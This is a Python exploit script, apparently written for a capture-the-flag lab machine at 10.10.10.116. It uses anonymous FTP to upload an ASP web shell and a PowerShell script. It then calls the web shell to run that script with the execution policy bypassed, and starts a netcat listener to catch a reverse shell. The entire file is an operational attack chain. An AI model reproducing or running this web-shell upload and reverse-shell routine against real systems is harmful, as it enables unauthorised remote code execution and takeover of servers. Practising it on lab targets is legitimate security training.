#!/usr/bin/python
import subprocess
import requests
import ftplib

def main():
	ftp()

	try:
		r = requests.get("http://10.10.10.116/upload/cmd.asp?cmd=powershell.exe%20-ExecutionPolicy%20Bypass%20C:%5Cinetpub%5Cwwwroot%5Cupload%5Cshell.ps1",verify=False,timeout=3)
	except:
		pass

	try:
		subprocess.call(['nc -lvnp 9191'], shell=True, stderr=subprocess.STDOUT)
	except:
		print('[*] Quitting netcat...')

def ftp():
	ftp = ftplib.FTP("10.10.10.116")
	ftp.login('anonymous', 'conceal')

	files = ['cmd.asp','shell.ps1']

	for filename in files:
		file = open('files/{}'.format(filename),'rb')
		ftp.storbinary('STOR {}'.format(filename), file)
		file.close()

	ftp.quit()

if __name__ == '__main__':
	main()
